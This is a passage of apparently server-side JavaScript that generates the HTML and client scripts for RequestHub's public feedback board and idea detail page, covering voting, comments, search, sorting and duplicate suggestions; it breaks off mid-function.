              <svg class="icon" viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.5.5l2-2a5 5 0 0 0-7-7l-1.5 1.5"/><path d="M14 11a5 5 0 0 0-7.5-.5l-2 2a5 5 0 0 0 7 7l1.5-1.5"/></svg>
              Connect your tools
            </a>
            <a class="sidebar-link" href="/b/${encodeURIComponent(customerSlug)}/settings">
              <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
              Settings
            </a>
            ${
              customerSlug === "demo"
                ? `<a class="sidebar-link cta" href="/signup">
              <svg class="icon" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
              Start your own board
            </a>`
                : ""
            }
          </div>
        </div>
        <div class="footer-note">Powered by RequestHub<br/>built on Fastn</div>
      </div>
    </div>
  </div>

  <script>
    const customerSlug = ${JSON.stringify(customerSlug)};
    const statuses = ${JSON.stringify(STATUSES)};
    let categories = ["Feature", "Bug", "Feedback"];
    let allIdeas = [];
    let statusLabels = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };
    let activeCategory = "all";
    let activeSort = "trending";

    var CATEGORY_PALETTE = [
      { bg: 'var(--accent-tint)', fg: 'var(--accent)' },
      { bg: 'var(--bad-tint)', fg: 'var(--bad)' },
      { bg: 'var(--good-tint)', fg: 'var(--good)' },
      { bg: 'var(--warn-tint)', fg: 'var(--warn)' },
      { bg: 'var(--info-tint)', fg: 'var(--info)' },
    ];
    function categoryColor(name) {
      var hash = 0;
      for (var i = 0; i < (name || '').length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
      return CATEGORY_PALETTE[hash % CATEGORY_PALETTE.length];
    }

    function trendingScore(idea) {
      // Hacker-News-style time decay: rewards votes earned by newer ideas over
      // the same vote count sitting on something old, without needing per-vote
      // timestamps (none are tracked today).
      var ageHours = (Date.now() - new Date(idea.created_at).getTime()) / 3600000;
      return (idea.votes + 1) / Math.pow(ageHours + 2, 1.5);
    }

    const ICONS = {
      chevronUp: '<svg class="icon" viewBox="0 0 24 24"><polyline points="18 15 12 9 6 15"/></svg>',
      chevronDown: '<svg class="icon" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>',
      comment: '<svg class="icon" viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-4.8 7.6 8.5 8.5 0 0 1-9.4-1.2L3 21l1.9-4.3a8.38 8.38 0 0 1-1.2-4.4 8.5 8.5 0 0 1 7.6-8.4 8.38 8.38 0 0 1 9.5 7.1 8.5 8.5 0 0 1 .2 1.5z"/></svg>',
      all: '<svg class="icon" viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>',
      Feature: '<svg class="icon" viewBox="0 0 24 24"><path d="M9 18h6M10 22h4M12 2a6 6 0 0 0-4 10.5c.7.6 1 1.3 1 2.5h6c0-1.2.3-1.9 1-2.5A6 6 0 0 0 12 2z"/></svg>',
      Bug: '<svg class="icon" viewBox="0 0 24 24"><rect x="8" y="7" width="8" height="12" rx="4"/><path d="M12 7V4M9 5l-1.5-1.5M15 5l1.5-1.5M5 11H3M21 11h-2M5 16H3M21 16h-2M8 19l-2 2M16 19l2 2"/></svg>',
      Feedback: '<svg class="icon" viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-4.8 7.6 8.5 8.5 0 0 1-9.4-1.2L3 21l1.9-4.3a8.38 8.38 0 0 1-1.2-4.4 8.5 8.5 0 0 1 7.6-8.4 8.38 8.38 0 0 1 9.5 7.1 8.5 8.5 0 0 1 .2 1.5z"/></svg>'
    };

    function render() {
      renderNav();
      const list = document.getElementById('list');
      const q = (document.getElementById('search').value || '').toLowerCase();
      const sort = activeSort;
      const statusFilterEl = document.getElementById('statusFilter');
      const status = statusFilterEl ? statusFilterEl.value : 'all';

      var commentMatchIds = {};
      let ideas = allIdeas.filter(function (i) {
        if (activeCategory !== 'all' && i.category !== activeCategory) return false;
        if (status !== 'all' && i.status !== status) return false;
        if (q) {
          var inTitle = i.title.toLowerCase().indexOf(q) !== -1;
          var inDesc = (i.description || '').toLowerCase().indexOf(q) !== -1;
          var inTags = (i.tags || []).some(function (t) { return t.toLowerCase().indexOf(q) !== -1; });
          var inComments = (commentsByIdea[i.id] || []).some(function (c) { return c.toLowerCase().indexOf(q) !== -1; });
          if (!inTitle && !inDesc && !inTags && !inComments) return false;
          if (inComments && !inTitle && !inDesc && !inTags) commentMatchIds[i.id] = true;
        }
        return true;
      });
      ideas = ideas.slice().sort(function (a, b) {
        var pinDiff = (b.is_pinned ? 1 : 0) - (a.is_pinned ? 1 : 0);
        if (pinDiff) return pinDiff;
        if (sort === 'new') return new Date(b.created_at) - new Date(a.created_at);
        if (sort === 'trending') return trendingScore(b) - trendingScore(a);
        if (sort === 'comments') return (b.comment_count || 0) - (a.comment_count || 0);
        return b.votes - a.votes;
      });

      if (!ideas.length) {
        list.innerHTML = '<div class="empty">No feedback yet - be the first!</div>';
        return;
      }
      const voted = getVotedIds();

      list.innerHTML = ideas.map(function (i) {
        const hasVoted = voted.indexOf(i.id) !== -1;
        return '<div class="idea' + (i.is_pinned ? ' pinned' : '') + '">' +
          '<div class="idea-row">' +
          '<div class="vote-widget">' +
          '<button class="vote-arrow up' + (hasVoted ? ' on' : '') + '" data-idea-id="' + i.id + '"' + (hasVoted ? ' disabled' : '') + ' title="Vote">' + ICONS.chevronUp + '</button>' +
          '<span class="vote-count">' + i.votes + '</span>' +
          '<button class="vote-arrow down' + (hasVoted ? '' : ' disabled') + '" data-idea-id="' + i.id + '"' + (hasVoted ? '' : ' disabled') + ' title="Remove vote">' + ICONS.chevronDown + '</button>' +
          '</div>' +
          '<div class="idea-body">' +
          '<div class="idea-title">' + (i.is_pinned ? '<span class="pin-badge" title="Pinned by the team">&#128204;</span> ' : '') + escapeHtml(i.title) + (commentMatchIds[i.id] ? ' <span class="comment-match-badge">Found in a comment</span>' : '') + '</div>' +
          (i.description ? '<div class="idea-desc">' + escapeHtml(i.description) + '</div>' : '') +
          '<div class="meta">' +
          '<span class="chip" style="background:' + categoryColor(i.category).bg + ';color:' + categoryColor(i.category).fg + '">' + (ICONS[i.category] || '') + escapeHtml(i.category) + '</span>' +
          '<span class="chip status-chip ' + i.status + '">' + escapeHtml(statusLabels[i.status] || i.status.replace('_', ' ')) + '</span>' +
          (i.tags || []).map(function (t) { return '<span class="tag-chip">#' + escapeHtml(t) + '</span>'; }).join('') +
          '<span class="meta-right">' +
          '<button class="comment-count" data-idea-id="' + i.id + '">' + ICONS.comment + '<span class="cc-num">' + (i.comment_count ? i.comment_count + ' Comment' + (i.comment_count === 1 ? '' : 's') : 'Comments') + '</span></button>' +
          '<a class="comment-count" href="/b/' + encodeURIComponent(customerSlug) + '/ideas/' + i.id + '" title="Shareable link to this idea">&#128279;</a>' +
          '</span>' +
          '</div>' +
          '<div class="comments" id="comments-' + i.id + '">' +
          '<div class="comments-list"></div>' +
          '<form class="comment-form" data-idea-id="' + i.id + '">' +
          '<input class="comment-name" placeholder="Your name" maxlength="80" aria-label="Your name" />' +
          '<input class="comment-email" type="email" placeholder="Email (optional)" maxlength="200" aria-label="Your email (optional)" />' +
          '<input class="comment-body" placeholder="Add a comment..." maxlength="2000" required aria-label="Comment" />' +
          '<button type="submit">Post</button>' +
          '</form>' +
          '</div>' +
          '</div>' +
          '</div>' +
          '</div>';
      }).join('');

      list.querySelectorAll('.vote-arrow').forEach(function (btn) {
        btn.addEventListener('click', function () {
          if (btn.disabled) return;
          const ideaId = btn.getAttribute('data-idea-id');
          const direction = btn.classList.contains('up') ? 'up' : 'down';
          fetch('/api/ideas/' + ideaId + '/vote', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ direction }),
          })
            .then(function (r) { return r.json(); })
            .then(function () {
              if (direction === 'up') addVotedId(Number(ideaId));
              else removeVotedId(Number(ideaId));
              load();
            });
        });
      });

      list.querySelectorAll('.comment-count').forEach(function (btn) {
        btn.addEventListener('click', function () {
          const ideaId = btn.getAttribute('data-idea-id');
          const panel = document.getElementById('comments-' + ideaId);
          const isOpen = panel.classList.toggle('open');
          if (isOpen) loadComments(ideaId);
        });
      });

      list.querySelectorAll('.comment-form').forEach(function (form) {
        form.addEventListener('submit', function (e) {
          e.preventDefault();
          const ideaId = form.getAttribute('data-idea-id');
          const nameInput = form.querySelector('.comment-name');
          const emailInput = form.querySelector('.comment-email');
          const bodyInput = form.querySelector('.comment-body');
          const body = bodyInput.value.trim();
          if (!body) return;
          fetch('/api/ideas/' + ideaId + '/comments', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({
              authorName: nameInput.value.trim() || 'Anonymous',
              authorEmail: emailInput.value.trim(),
              body,
            }),
          })
            .then(function (r) { return r.json(); })
            .then(function () {
              bodyInput.value = '';
              loadComments(ideaId);
            });
        });
      });
    }

    function renderNav() {
      const nav = document.getElementById('categoryNav');
      const counts = { all: allIdeas.length };
      categories.forEach(function (c) { counts[c] = allIdeas.filter(function (i) { return i.category === c; }).length; });
      const items = [{ key: 'all', label: 'All feedback', icon: ICONS.all }].concat(
        categories.map(function (c) { return { key: c, label: c, icon: ICONS[c] }; })
      );
      nav.innerHTML = items.map(function (it) {
        return '<button class="nav-item' + (activeCategory === it.key ? ' active' : '') + '" data-cat="' + it.key + '">' +
          (it.icon || '') + '<span>' + escapeHtml(it.label) + '</span><span class="count">' + counts[it.key] + '</span></button>';
      }).join('');
      nav.querySelectorAll('.nav-item').forEach(function (btn) {
        btn.addEventListener('click', function () {
          activeCategory = btn.getAttribute('data-cat');
          render();
        });
      });
    }

    function loadComments(ideaId) {
      const panel = document.getElementById('comments-' + ideaId);
      const listEl = panel.querySelector('.comments-list');
      listEl.innerHTML = '<div class="empty">Loading...</div>';
      fetch('/api/ideas/' + ideaId + '/comments')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          const comments = d.comments || [];
          if (!comments.length) {
            listEl.innerHTML = '<div class="empty">No comments yet.</div>';
            return;
          }
          listEl.innerHTML = comments.map(function (c) {
            const initial = (c.author_name || '?').trim().charAt(0).toUpperCase() || '?';
            return '<div class="comment">' +
              '<div class="comment-avatar">' + escapeHtml(initial) + '</div>' +
              '<div class="comment-body-text"><span class="comment-author">' + escapeHtml(c.author_name) + '</span>' + escapeHtml(c.body) + '</div>' +
              '</div>';
          }).join('');
        });
    }

    function getVotedIds() {
      try { return JSON.parse(localStorage.getItem('requesthub_voted_' + customerSlug) || '[]'); }
      catch { return []; }
    }
    function addVotedId(id) {
      try {
        const ids = getVotedIds();
        if (ids.indexOf(id) === -1) ids.push(id);
        localStorage.setItem('requesthub_voted_' + customerSlug, JSON.stringify(ids));
      } catch {}
    }
    function removeVotedId(id) {
      try {
        const ids = getVotedIds().filter(function (v) { return v !== id; });
        localStorage.setItem('requesthub_voted_' + customerSlug, JSON.stringify(ids));
      } catch {}
    }

    function escapeHtml(s) {
      const d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function populateCategorySelect() {
      const sel = document.getElementById('category');
      if (!sel) return;
      const current = sel.value;
      sel.innerHTML = categories.map(function (c) { return '<option value="' + escapeHtml(c) + '">' + escapeHtml(c) + '</option>'; }).join('');
      if (categories.indexOf(current) !== -1) sel.value = current;
    }

    function populateStatusFilter() {
      const sel = document.getElementById('statusFilter');
      if (!sel) return;
      const current = sel.value;
      sel.innerHTML = '<option value="all">All statuses</option>' +
        statuses.map(function (s) { return '<option value="' + s + '">' + escapeHtml(statusLabels[s] || s) + '</option>'; }).join('');
      sel.value = current || 'all';
    }

    var commentsByIdea = {};

    function load() {
      fetch('/api/ideas?customer=' + encodeURIComponent(customerSlug) + '&includeComments=1')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          allIdeas = d.ideas || [];
          if (d.statusLabels) statusLabels = d.statusLabels;
          if (d.categories && d.categories.length) categories = d.categories;
          commentsByIdea = d.commentsByIdea || {};
          populateCategorySelect();
          populateStatusFilter();
          render();
        })
        .catch(function () {
          document.getElementById('list').innerHTML =
            '<div class="empty">Could not load feedback right now. <a href="#" onclick="location.reload();return false;">Retry</a></div>';
        });
    }

    document.getElementById('search').addEventListener('input', render);
    document.getElementById('statusFilter').addEventListener('change', render);

    document.querySelectorAll('.filter-tab').forEach(function (btn) {
      btn.addEventListener('click', function () {
        document.querySelectorAll('.filter-tab').forEach(function (b) { b.classList.remove('active'); });
        btn.classList.add('active');
        activeSort = btn.getAttribute('data-sort');
        render();
      });
    });

    document.getElementById('openFormBtn').addEventListener('click', function () {
      document.getElementById('formCard').classList.add('open');
      document.getElementById('title').focus();
    });
    document.getElementById('cancelFormBtn').addEventListener('click', function () {
      document.getElementById('formCard').classList.remove('open');
      clearSimilarIdeas();
    });

    function clearSimilarIdeas() {
      const box = document.getElementById('similarIdeas');
      box.classList.remove('open');
      box.innerHTML = '';
    }

    let similarIdeasTimer = null;
    document.getElementById('title').addEventListener('input', function () {
      clearTimeout(similarIdeasTimer);
      const q = this.value.trim();
      similarIdeasTimer = setTimeout(function () { renderSimilarIdeas(q); }, 250);
    });

    function renderSimilarIdeas(query) {
      // Canny's single most-copied anti-duplicate trick: surface likely-existing
      // ideas while the submitter is still typing, so they upvote instead of
      // filing a near-duplicate the team then has to notice and merge by hand.
      const words = query.toLowerCase().split(/\\s+/).filter(function (w) { return w.length > 2; });
      if (!words.length) return clearSimilarIdeas();
      const matches = allIdeas
        .map(function (i) {
          const haystack = (i.title + ' ' + (i.description || '')).toLowerCase();
          const score = words.reduce(function (sum, w) { return sum + (haystack.indexOf(w) !== -1 ? 1 : 0); }, 0);
          return { idea: i, score: score };
        })
        .filter(function (m) { return m.score > 0; })
        .sort(function (a, b) { return b.score - a.score || b.idea.votes - a.idea.votes; })
        .slice(0, 3);
      if (!matches.length) return clearSimilarIdeas();
      const votedIds = getVotedIds();
      const box = document.getElementById('similarIdeas');
      box.innerHTML = '<div class="similar-ideas-label">Already suggested? Upvote instead of posting a duplicate:</div>' +
        matches.map(function (m) {
          const i = m.idea;
          const hasVoted = votedIds.indexOf(i.id) !== -1;
          return '<div class="similar-idea-row">' +
            '<span class="similar-idea-title" title="' + escapeHtml(i.title) + '">' + escapeHtml(i.title) + '</span>' +
            '<span class="similar-idea-votes">' + i.votes + ' vote' + (i.votes === 1 ? '' : 's') + '</span>' +
            '<button type="button" class="similar-idea-upvote" data-idea-id="' + i.id + '"' + (hasVoted ? ' disabled' : '') + '>' + (hasVoted ? 'Voted' : 'Upvote') + '</button>' +
            '</div>';
        }).join('');
      box.classList.add('open');
      box.querySelectorAll('.similar-idea-upvote').forEach(function (btn) {
        btn.addEventListener('click', function () {
          if (btn.disabled) return;
          const ideaId = btn.getAttribute('data-idea-id');
          btn.disabled = true;
          btn.textContent = 'Voted';
          fetch('/api/ideas/' + ideaId + '/vote', {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ direction: 'up' }),
          })
            .then(function (r) { return r.json(); })
            .then(function () {
              addVotedId(Number(ideaId));
              load();
            });
        });
      });
    }

    document.addEventListener('keydown', function (e) {
      const tag = (document.activeElement && document.activeElement.tagName) || '';
      const typing = tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
      if (e.key === 'Escape') {
        document.getElementById('formCard').classList.remove('open');
        clearSimilarIdeas();
        if (document.activeElement) document.activeElement.blur();
        return;
      }
      if (typing) return;
      if (e.key === 'c') {
        e.preventDefault();
        document.getElementById('formCard').classList.add('open');
        document.getElementById('title').focus();
      } else if (e.key === '/') {
        e.preventDefault();
        document.getElementById('search').focus();
      }
    });

    document.getElementById('submit-form').addEventListener('submit', function (e) {
      e.preventDefault();
      const title = document.getElementById('title').value.trim();
      const description = document.getElementById('description').value.trim();
      const category = document.getElementById('category').value;
      const submitterEmail = document.getElementById('submitterEmail').value.trim();
      const tags = document.getElementById('tags').value.split(',').map(function (t) { return t.trim(); }).filter(Boolean);
      if (!title) return;
      const submitBtn = document.getElementById('submitFormBtn');
      submitBtn.disabled = true;
      submitBtn.textContent = 'Submitting...';
      fetch('/api/ideas', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ customerSlug, title, description, category, submitterEmail, tags }),
      })
        .then(function (r) { return r.json(); })
        .then(function () {
          document.getElementById('title').value = '';
          document.getElementById('description').value = '';
          document.getElementById('submitterEmail').value = '';
          document.getElementById('tags').value = '';
          document.getElementById('formCard').classList.remove('open');
          clearSimilarIdeas();
          load();
        })
        .catch(function () {
          alert('Could not submit your feedback right now - please try again.');
        })
        .finally(function () {
          submitBtn.disabled = false;
          submitBtn.textContent = 'Submit';
        });
    });

    load();
  </script>
  ${["acme-saas", "demo"].includes(customerSlug) ? `<script src="/embed.js" data-customer="${escapeHtml(customerSlug)}"></script>` : ""}
</body>
</html>`;
}

function ideaDetailPage(customerSlug, ideaId, isOwner, isAdmin, metaTitle, metaDescription) {
  const pageTitle = metaTitle ? `${metaTitle} - ${customerSlug}` : `Idea - ${customerSlug}`;
  const pageDescription = metaDescription
    ? metaDescription.length > 200 ? metaDescription.slice(0, 197) + "..." : metaDescription
    : `View and vote on this idea on ${customerSlug}'s feedback board.`;
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${escapeHtml(pageTitle)} - RequestHub</title>
  <meta name="description" content="${escapeHtml(pageDescription)}" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="${escapeHtml(pageTitle)} - RequestHub" />
  <meta property="og:description" content="${escapeHtml(pageDescription)}" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:title" content="${escapeHtml(pageTitle)} - RequestHub" />
  <meta name="twitter:description" content="${escapeHtml(pageDescription)}" />
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 0 24px; display: flex; align-items: center; gap: 4px; height: 56px; }
    @media (max-width: 600px) {
      .topbar { flex-wrap: wrap; height: auto; padding: 10px 16px; }
    }
    .logo-mark { width: 26px; height: 26px; border-radius: 7px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; }
    .brand { font-weight: 700; font-size: 14px; margin-right: 14px; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
    .nav-right a, .nav-right button { color: var(--text-muted); text-decoration: none; font-size: 13px; font-weight: 600; background: none; border: none; cursor: pointer; font-family: inherit; }
    .nav-right a:hover, .nav-right button:hover { color: var(--text); }

    .page { max-width: 720px; margin: 0 auto; padding: 32px 24px; }
    .not-found { text-align: center; color: var(--text-faint); padding: 60px 16px; }

    .idea-card { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 24px; }
    .idea-top { display: flex; gap: 16px; align-items: flex-start; }
    .vote-box {
      flex-shrink: 0; display: flex; flex-direction: column; align-items: center; justify-content: center;
      width: 48px; border: 1px solid var(--border); border-radius: 10px; padding: 8px 0; color: var(--text-faint); cursor: pointer; background: none; font-family: inherit;
    }
    .vote-box:hover { border-color: var(--accent); }
    .vote-box.voted { border-color: var(--accent); background: var(--accent-tint); color: var(--accent); }
    .vote-box .icon { width: 16px; height: 16px; }
    .vote-box .vote-num { font-size: 16px; font-weight: 700; color: var(--text); margin-top: 2px; }
    .idea-title { font-size: 20px; font-weight: 700; margin: 0 0 8px; }
    .idea-desc { color: var(--text-muted); font-size: 14px; line-height: 1.6; white-space: pre-wrap; }
    .idea-meta { margin-top: 14px; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
    .chip { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: var(--radius-pill); font-weight: 600; font-size: 11px; }
    .chip.status-chip.under_review { background-color: var(--surface-3); color: var(--text-muted); }
    .chip.status-chip.planned { background-color: var(--info-tint); color: var(--info); }
    .chip.status-chip.in_progress { background-color: var(--warn-tint); color: var(--warn); }
    .chip.status-chip.shipped { background-color: var(--good-tint); color: var(--good); }
    .chip.status-chip.declined { background-color: var(--bad-tint); color: var(--bad); }
    .chip.badge { background: var(--surface-3); color: var(--text-muted); text-decoration: none; }

    .subscribe-row { margin-top: 14px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
    .subscribe-row input {
      background: var(--surface-2); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 7px 10px; font-size: 12.5px; font-family: inherit; min-width: 180px;
    }
    .subscribe-row button {
      background: none; border: 1px solid var(--border); color: var(--text-muted); border-radius: 8px;
      padding: 7px 12px; font-size: 12.5px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .subscribe-row button:hover { color: var(--text); border-color: var(--accent); }
    .subscribe-done { color: var(--good); font-size: 12.5px; font-weight: 600; }

    .timeline { margin-top: 18px; display: flex; flex-direction: column; gap: 6px; }
    .timeline-item { font-size: 12px; color: var(--text-muted); display: flex; gap: 6px; align-items: baseline; }
    .timeline-item .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
    .timeline-date { color: var(--text-faint); margin-left: auto; font-size: 11px; }
    .comments-section { margin-top: 24px; }
    .comments-title { font-size: 14px; font-weight: 700; margin-bottom: 12px; }
    .comment { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px solid var(--border); }
    .comment:last-child { border-bottom: none; }
    .comment-avatar { width: 28px; height: 28px; border-radius: 50%; background: var(--accent-tint); color: var(--accent); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 12px; flex-shrink: 0; }
    .comment.is-team .comment-avatar { background: var(--accent); color: #fff; }
    .comment.is-internal { background: var(--warn-tint); border-radius: 8px; padding: 10px; }
    .comment-body-text { font-size: 13px; color: var(--text); line-height: 1.5; }
    .comment-author { font-weight: 700; margin-right: 6px; }
    .comment-badge { display: inline-block; font-size: 10px; font-weight: 700; padding: 1px 6px; border-radius: 999px; margin-right: 6px; vertical-align: 1px; }
    .comment-badge.team { background: var(--accent-tint); color: var(--accent); }
    .comment-badge.internal { background: var(--warn); color: #fff; }
    .comment-form { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 14px; align-items: center; }
    .comment-form input { flex: 1; background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px; padding: 9px 12px; font-size: 13px; font-family: inherit; }
    .comment-form button { background: var(--accent); color: #fff; border: none; padding: 9px 16px; border-radius: var(--radius-btn); font-weight: 600; font-size: 13px; cursor: pointer; font-family: inherit; }
    .comment-form label { font-size: 12px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; white-space: nowrap; }
    .empty { color: var(--text-faint); font-size: 13px; padding: 8px 0; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">${escapeHtml(customerSlug)}</div>
    <div class="nav-right">
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      ${isOwner ? `<a href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}">&larr; Back to board</a>
      <button type="button" id="copyLinkBtn">Copy link</button>
    </div>
  </div>
  <div class="page" id="page">
    <div class="not-found">Loading...</div>
  </div>
  <script>
    var customerSlug = ${JSON.stringify(customerSlug)};
    var ideaId = ${JSON.stringify(String(ideaId))};
    var isAdmin = ${isAdmin ? "true" : "false"};
    var statusLabels = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };

    var CATEGORY_PALETTE = [
      { bg: 'var(--accent-tint)', fg: 'var(--accent)' },
      { bg: 'var(--bad-tint)', fg: 'var(--bad)' },
      { bg: 'var(--good-tint)', fg: 'var(--good)' },
      { bg: 'var(--warn-tint)', fg: 'var(--warn)' },
      { bg: 'var(--info-tint)', fg: 'var(--info)' },
    ];
    function categoryColor(name) {
      var hash = 0;
      for (var i = 0; i < (name || '').length; i++) hash = (hash * 31 + name.charCodeAt(i)) >>> 0;
      return CATEGORY_PALETTE[hash % CATEGORY_PALETTE.length];
    }

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.innerText = s || '';
      return d.innerHTML;
    }

    function getVotedIds() {
      try { return JSON.parse(localStorage.getItem('requesthub_voted_' + customerSlug) || '[]'); }
      catch (e) { return []; }
    }
    function addVotedId(id) {
      try {
        var ids = getVotedIds();
        if (ids.indexOf(id) === -1) ids.push(id);
        localStorage.setItem('requesthub_voted_' + customerSlug, JSON.stringify(ids));
      } catch (e) {}
    }
    function removeVotedId(id) {
      try {
        var ids = getVotedIds().filter(function (v) { return v !== id; });
        localStorage.setItem('requesthub_voted_' + customerSlug, JSON.stringify(ids));
      } catch (e) {}
    }

    function getSubscribedIds() {
      try { return JSON.parse(localStorage.getItem('requesthub_subscribed_' + customerSlug) || '[]'); }
      catch (e) { return []; }
    }
    function addSubscribedId(id) {
      try {
        var ids = getSubscribedIds();
        if (ids.indexOf(id) === -1) ids.push(id);
        localStorage.setItem('requesthub_subscribed_' + customerSlug, JSON.stringify(ids));
      } catch (e) {}
    }

    document.getElementById('copyLinkBtn').addEventListener('click', function () {
      var btn = this;
      navigator.clipboard.writeText(window.location.href).then(function () {
        btn.textContent = 'Copied!';
        setTimeout(function () { btn.textContent = 'Copy link'; }, 1500);
      });
    });

    function renderIdea(idea) {
      var page = document.getElementById('page');
      var voted = getVotedIds().indexOf(idea.id) !== -1;
      var badges = [];
      if (idea.submitter_email) badges.push('<span class="chip badge">' + escapeHtml(idea.submitter_email) + '</span>');
      if (idea.linear_issue_url) badges.push('<a class="chip badge" href="' + idea.linear_issue_url + '" target="_blank" rel="noopener">Linear ticket &#8599;</a>');
      if (idea.notion_archived_at) badges.push('<span class="chip badge">Archived to Notion</span>');
      var date = idea.created_at ? new Date(idea.created_at).toLocaleDateString() : '';

      page.innerHTML =
        '<div class="idea-card">' +
        '<div class="idea-top">' +
        '<button type="button" class="vote-box' + (voted ? ' voted' : '') + '" id="voteBtn">' +
        '<svg class="icon" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><polyline points="18 15 12 9 6 15"/></svg>' +
        '<span class="vote-num">' + idea.votes + '</span>' +
        '</button>' +
        '<div style="flex:1;min-width:0;">' +
        '<div class="idea-title">' + escapeHtml(idea.title) + '</div>' +
        (idea.description ? '<div class="idea-desc">' + escapeHtml(idea.description) + '</div>' : '') +
        '<div class="idea-meta">' +
        '<span class="chip" style="background:' + categoryColor(idea.category).bg + ';color:' + categoryColor(idea.category).fg + '">' + escapeHtml(idea.category) + '</span>' +
        '<span class="chip status-chip ' + idea.status + '">' + escapeHtml(statusLabels[idea.status] || idea.status) + '</span>' +
        (idea.tags || []).map(function (t) { return '<span class="tag-chip">#' + escapeHtml(t) + '</span>'; }).join('') +
        badges.join('') +
        '<span style="color:var(--text-faint);font-size:11px;margin-left:auto;">' + date + '</span>' +
        '</div>' +
        '<div class="subscribe-row" id="subscribeRow">' +
        (getSubscribedIds().indexOf(idea.id) !== -1
          ? '<span class="subscribe-done">&#9993; You\\'ll get emailed about updates to this idea.</span>'
          : '<input id="subscribeEmail" type="email" placeholder="your@email.com" aria-label="Your email address" />' +
            '<button type="button" id="subscribeBtn">Notify me about updates</button>') +
        '</div>' +
        '<div class="timeline" id="timeline"></div>' +
        '</div>' +
        '</div>' +
        '<div class="comments-section">' +
        '<div class="comments-title">Comments</div>' +
        '<div class="comments-list" id="commentsList"><div class="empty">Loading...</div></div>' +
        '<div class="comment-form">' +
        '<input id="commentName" placeholder="Your name" style="max-width:140px;" aria-label="Your name" />' +
        '<input id="commentBody" placeholder="Add a comment..." aria-label="Comment" />' +
        (isAdmin ? '<label><input type="checkbox" id="commentInternal" /> Internal note</label>' : '') +
        '<button type="button" id="commentBtn">Post</button>' +
        '</div>' +
        '</div>' +
        '</div>';

      document.getElementById('voteBtn').addEventListener('click', function () {
        var nowVoted = getVotedIds().indexOf(idea.id) !== -1;
        var direction = nowVoted ? 'down' : 'up';
        fetch('/api/ideas/' + idea.id + '/vote', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ direction: direction }),
        })
          .then(function (r) { return r.json(); })
          .then(function (d) {
            if (d.ok) {
              if (direction === 'up') addVotedId(idea.id); else removeVotedId(idea.id);
              load();
            }
